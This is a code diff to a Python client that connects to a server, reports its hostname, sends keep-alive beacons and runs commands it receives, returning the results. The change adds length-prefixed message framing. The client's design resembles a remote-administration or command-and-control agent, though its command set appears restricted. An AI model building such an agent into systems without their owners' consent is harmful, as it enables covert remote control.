@@ -98,13 +98,48 @@ def execute_command(command_str):
     return f'Command "{command}" not recognized. Available: {", ".join(get_available_commands())}'
 
 
+def send_message(conn, text):
+    """
+    Send a length-prefixed message.
+    Format: 4-byte big-endian length header followed by UTF-8 payload.
+    """
+    encoded = text.encode('utf-8')
+    header  = len(encoded).to_bytes(4, byteorder='big')
+    conn.sendall(header + encoded)
+
+
+def recv_message(conn):
+    """
+    Receive a complete length-prefixed message.
+    Blocks until all bytes have arrived.
+    Returns the decoded string, or None if the connection closed.
+    """
+    header = b''
+    while len(header) < 4:
+        chunk = conn.recv(4 - len(header))
+        if not chunk:
+            return None
+        header += chunk
+
+    length = int.from_bytes(header, byteorder='big')
+
+    payload = b''
+    while len(payload) < length:
+        chunk = conn.recv(min(4096, length - len(payload)))
+        if not chunk:
+            return None
+        payload += chunk
+
+    return payload.decode('utf-8')
+
+
 def handle_command(conn, command):
     if not command:
         return
     result = execute_command(command)
     payload = f'RESULT_START\n{result}\nRESULT_END'
     try:
-        conn.sendall(payload.encode())
+        send_message(conn, payload)
     except OSError as e:
         logging.error(f"Error sending result: {e}")
 
@@ -116,7 +151,7 @@ def send_keep_alive(conn):
         try:
             if conn.fileno() == -1:
                 break
-            conn.sendall(b'KEEP_ALIVE')
+            send_message(conn, 'KEEP_ALIVE')
             time.sleep(30)
         except OSError as e:
             logging.error(f"Keep-alive error: {e}")
@@ -216,7 +251,7 @@ def start_client():
             logging.info("Connected and authenticated. Backoff reset.")
 
             hostname = socket.gethostname()
-            conn.sendall(f'HOSTNAME:{hostname}'.encode())
+            send_message(conn, f'HOSTNAME:{hostname}')
 
             threading.Thread(target=send_keep_alive, args=(conn,), daemon=True).start()
             threading.Thread(
@@ -227,12 +262,11 @@ def start_client():
 
             while True:
                 try:
-                    data = conn.recv(1024)
-                    if not data:
-                        # Empty recv means the server closed the connection
+                    command = recv_message(conn)
+                    if command is None:
                         logging.warning("Server disconnected (empty recv)")
                         break
-                    command = data.decode().strip()
+                    command = command.strip()
                     logging.debug(f"Received: {command}")
                     if command.lower() == 'exit':
                         break
